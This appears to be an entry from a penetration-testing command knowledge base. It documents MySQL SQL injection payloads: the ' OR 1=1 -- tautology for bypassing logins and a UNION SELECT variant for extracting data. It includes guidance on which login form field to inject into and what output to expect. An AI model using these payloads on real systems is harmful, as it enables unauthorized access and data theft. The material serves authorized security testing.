---
id: 21476395-2584-46c7-8eae-4c9a4421ad6e-test
name: mysql-test-sql-injection
type: command
executor: sql
data: ' '' OR 1=1 -- '
output: null
created_at: '2023-04-06T03:56:36.647809+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Web
  - MySQL
tags:
  - SQL Injection
  - Testing
verified: true
validated: true
---

# mysql-test-sql-injection

## Command

```sql
' OR 1=1 --
```

## Description

This command tests for SQL injection vulnerability by injecting a tautology that alters the query logic, often causing authentication bypass or error exposure in MySQL-based web apps.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `' OR 1=1` | Tautology to make WHERE clause always true | Yes |
| `--` | SQL comment to ignore trailing query parts | Yes |

## Examples

### Basic Usage

```sql
' OR 1=1 --
```

Inject into email or username field of a login form.

### Advanced Usage

```sql
' UNION SELECT 1,2,3 --
```

For extracting data after basic test.

## Expected Output

Successful injection may return a SQL syntax error like "You have an error in your SQL syntax" or bypass login to show authenticated content without valid credentials.

## Related

- [[procedures/SQL-Injection-Admin-Password-Change-via-ON-DUPLICATE-KEY-UPDATE]]
- [[commands/mysql-inject-admin-password-update]]
